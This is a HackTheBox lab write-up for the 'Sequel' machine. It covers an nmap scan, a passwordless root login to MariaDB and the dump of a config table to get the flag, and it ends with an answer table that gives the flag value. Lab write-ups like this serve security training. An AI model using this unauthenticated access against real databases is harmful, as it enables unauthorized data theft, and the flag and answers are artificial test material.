TITLE: Sequel
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/ce52eadd09ff5a28a1eea8c65d6683a9.png.1
---

# Sequel

Sequel focuses on MariaDB/MySQL enumeration and data extraction.

## Recon

Nmap reveals port 3306 is open, which is the default port for MariaDB/MySQL.

```bash
nmap -sC -sV 10.129.142.167
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 3306 | MariaDB | MariaDB (no password) |

## Exploitation

We connect to the database as the `root` user without a password.

```bash
mysql -h 10.129.142.167 -u root
```

Once connected, we explore the databases and tables.

```sql
MariaDB [(none)]> show databases;
MariaDB [(none)]> use htb;
MariaDB [htb]> show tables;
MariaDB [htb]> select * from config;
```

The flag is found in the `config` table of the `htb` database.

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | What does the acronym SQL stand for? | `Structured Query Language` |
| 2 | What is one of the most common type of vulnerabilities in web applications that allows an attacker to interfere with the queries that an application makes to its database? | `SQL Injection` |
| 3 | What is the 2021 OWASP Top 10 classification that SQL injection falls under? | `A03:2021-Injection` |
| 4 | What is the port number for MySQL? | `3306` |
| 5 | What is the command used to list all the databases in MySQL? | `show databases;` |
| 6 | What is the command used to select a database in MySQL? | `use` |
| 7 | What is the command used to list all the tables in a database? | `show tables;` |
| 8 | What is the command used to display all the content of a table? | `select * from table_name;` |
| 9 | Submit root flag | `7b4bec00d1a96131f03d40c71040b68a` |
